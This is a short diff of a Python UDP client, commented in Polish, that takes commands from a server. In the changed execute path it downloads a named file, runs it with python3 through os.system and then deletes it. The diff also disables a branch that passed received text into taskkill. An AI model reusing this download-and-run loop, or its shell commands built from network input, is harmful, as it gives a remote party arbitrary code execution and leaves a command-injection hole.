@@ -19,9 +19,9 @@ def receive_req():
         execute(data[4::])
         print("koniec")
         
-    if(data[0:4] == "kil:"):
-        print("kill")
-        os.system("taskkill /im" + data[4::])
+    #if(data[0:4] == "kil:"):
+    #    print("kill")
+    #    os.system("taskkill /im" + data[4::])
         
 def download_prog(message):
     if(message !='q'):
@@ -35,25 +35,19 @@ def download_prog(message):
             file.write(bytes(data))
             file.close()
             print("odebrano")
-            
+            message = "uruchomiono"
+            s.sendto(message.encode('utf-8'), server)
 
         except:
             print("Brak połączenia")
             
-##windows
+
 def execute(prog_name):
-    print("execute")
-    if(os.path.exists(prog_name)):
-        message = "ok"
-        s.sendto(message.encode('utf-8'), server)
-        print("if")
-    #       print(subprocess.check_output(prog_name, shell=True, text=True))
-    #print(os.system('cmd /k "tescik.exe"'))
-    else:
-        download_prog(prog_name)
-        time.sleep(2)
-      #  if(os.path.exists(prog_name)):
-     #          print(subprocess.check_output(prog_name, shell=True, text=True))
+    
+    download_prog(prog_name)
+    time.sleep(2)
+    os.system('python3 '+str(prog_name))
+    os.system('rm '+prog_name)
 
 receive_req()
 
